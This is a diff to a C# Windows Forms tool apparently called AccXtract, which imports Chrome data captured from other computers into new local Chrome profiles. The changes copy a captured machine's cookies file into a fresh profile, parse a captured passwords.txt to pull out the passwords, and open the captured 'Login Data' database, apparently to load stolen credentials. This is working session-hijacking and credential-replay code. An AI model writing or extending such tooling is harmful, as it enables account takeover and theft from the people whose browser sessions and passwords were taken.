@@ -26,6 +26,7 @@ using System.Drawing;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
+using System.Data.SQLite;
 
 namespace AccXtract
 {
@@ -70,6 +71,7 @@ namespace AccXtract
                         }
 
                         //this will be changed later
+                        //will add support for removing profiles
                         currentButton.Enabled = false;
 
                         currentNumberOfProfiles++;
@@ -102,7 +104,6 @@ namespace AccXtract
 
                     
                     lastGroup = addNewComputer(computer);
-                    //LoadChrome(computer, false);
                 }
             }
         }
@@ -112,15 +113,8 @@ namespace AccXtract
             Process[] chrome = Process.GetProcessesByName("chrome");
             if (chrome.Length == 0)
             {
-                Console.WriteLine("Chrome not running");
-
-
-
-
-
                 Button button = (Button)sender;
                 string profileName = button.Text;
-
 
                 string localStatePath = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%") + @"\AppData\Local\Google\Chrome\User Data\";
                 StreamReader localState = new StreamReader(localStatePath + "\\Local State");
@@ -194,23 +188,45 @@ namespace AccXtract
                 string computerName = group.Text;
 
                 string newUserProfile = localStatePath + "Profile " + highestProfileNumber.ToString();
+                string capturedUserProfile = AccXtractFolder + "\\" + computerName + "\\Chrome\\" + button.Text;
+
                 Directory.CreateDirectory(newUserProfile);
-                File.Copy(AccXtractFolder + "\\" + computerName + "\\Chrome\\" + button.Text + "\\cookies", newUserProfile + "\\cookies");
+
+                //Add cookies to profile
+                File.Copy(capturedUserProfile + "\\cookies", newUserProfile + "\\cookies");
+
+                #region Add passwords
+                //Add passwords to profile
+                string[] data = File.ReadAllLines(capturedUserProfile + "\\passwords.txt");
+                List<string> passwords = new List<string>();
+                for (int i = 0; i < data.Length; i++)
+                {
+                    //get every third object (passwords)
+                    //I left the other stuff in there in case someone to manually read the passwords.txt file
+                    //or do something else with it
+
+                    if (((i + 1) % 3) == 0)
+                    {
+                        passwords.Add(data[i]);
+                    }
+                }
+
+                SQLiteConnection conn = new SQLiteConnection("Data Source=" + capturedUserProfile + "\\Login Data");
+                conn.Open();
+
+                #endregion
+
+
                 File.Copy(localStatePath + "\\Local State.out", localStatePath + "\\Local State", true);
                 File.Delete(localStatePath + "Local State.out");
 
                 button.Enabled = false;
             }
 
-            else
-            {
-                Console.WriteLine("Chrome running");
-
-                MessageBox.Show("Please close Chrome and try again");
-            }
+            else MessageBox.Show("Please close Chrome and try again");
         }
 
-        #region New Creation Functions
+        #region UI Functions
         private GroupBox addNewComputer(string path)
         {
             GroupBox newGroup = new GroupBox();
